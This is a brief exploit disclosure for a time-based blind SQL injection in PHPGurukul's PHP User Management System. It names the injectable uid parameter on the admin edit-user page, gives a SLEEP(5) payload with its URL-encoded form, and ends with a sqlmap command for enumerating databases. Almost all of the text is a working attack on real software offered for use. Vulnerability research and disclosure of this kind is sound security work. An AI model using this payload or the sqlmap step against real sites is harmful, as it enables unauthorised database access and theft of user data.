# Exploit Author: Zeyad Azima
# Vendor Homepage: https://phpgurukul.com/
# Software Link: https://phpgurukul.com/user-management-system-in-php-using-stored-procedure/
# Version: V1
# Tested on: Windows

# Identify the vulnerability

1- go to http://localhost/admin/ and login with your account

2- then go to http://localhost/admin/registered-users.php

3- Click edit on any user and then add the following payload to the url

payload: AND (SELECT 5008 FROM (SELECT(SLEEP(5)))zVHT)
url: http://localhost/ums-sp/admin/edit-user-profile.php?uid=3%20AND%20(SELECT%205008%20FROM%20(SELECT(SLEEP(5)))zVHT)

If the web server makes you wait 5 seconds then it's vulnerable


# Exploit

Now you can exploit it using sqlmap

command: sqlmap -u url --cookies="cookies here" --dbs
